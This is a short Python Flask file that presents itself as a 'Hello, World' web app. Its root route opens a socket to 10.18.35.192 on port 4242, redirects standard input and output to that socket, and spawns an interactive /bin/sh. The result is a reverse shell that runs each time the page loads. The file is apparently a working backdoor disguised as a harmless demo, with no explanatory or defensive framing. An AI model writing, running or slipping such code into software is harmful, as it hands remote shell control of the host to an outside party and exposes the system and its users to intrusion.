from flask import Flask
import socket,subprocess,os

app = Flask(__name__)

@app.route('/')
def hello_world():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.18.35.192",4242))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])
    return 'Hello, World!'

if __name__ == '__main__':
    app.run()


